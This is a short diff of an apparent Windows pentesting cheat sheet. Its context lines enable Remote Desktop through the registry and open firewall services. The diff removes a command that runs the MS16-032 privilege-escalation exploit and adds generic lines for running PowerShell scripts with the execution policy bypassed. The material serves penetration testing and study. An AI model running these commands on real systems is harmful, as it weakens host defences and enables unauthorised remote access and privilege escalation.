@@ -40,5 +40,10 @@ reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSCon
 netsh firewall set service remoteadmin enable
 netsh firewall set service remotedesktop enable
 
-# run an exploit
-powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+# run an exploit on cmd.exe
+powershell -ExecutionPolicy ByPass -command "<command here>"
+powershell -ExecutionPolicy ByPass -command ./test.ps1
+powershell -ExecutionPolicy ByPass -command C:\Users\<username>\Desktop\test.ps1
+
+# run on Powershell
+ Set-ExecutionPolicy Bypass -force; cd C:\Users\<username>\Desktop\; .\test.ps1
